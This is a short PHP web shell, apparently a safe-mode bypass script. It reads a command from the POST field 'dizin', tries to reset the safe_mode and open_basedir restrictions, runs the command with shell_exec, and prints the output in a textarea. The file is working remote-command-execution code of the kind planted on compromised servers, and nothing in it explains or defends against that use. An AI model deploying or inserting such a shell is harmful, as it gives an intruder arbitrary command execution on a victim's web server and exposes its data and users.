<?php
$evilc0der=$_POST['dizin'];

ini_restore("safe_mode");
ini_restore("open_basedir");
$safemodgec = shell_exec($evilc0der);
echo "<textarea rows=17 cols=85>$safemodgec</textarea>";
?>